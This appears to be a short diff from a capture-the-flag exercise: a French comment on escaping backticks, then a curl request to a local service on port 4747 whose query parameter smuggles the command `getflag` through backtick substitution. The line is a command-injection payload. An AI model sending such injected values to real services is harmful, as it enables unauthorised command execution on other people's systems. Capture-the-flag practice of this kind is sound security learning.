@@ -1,0 +1,3 @@
+#backlash (échappé) est essentiel pour utiliser les backticks.
+
+curl "http://localhost:4747/?x=\`getflag\`"
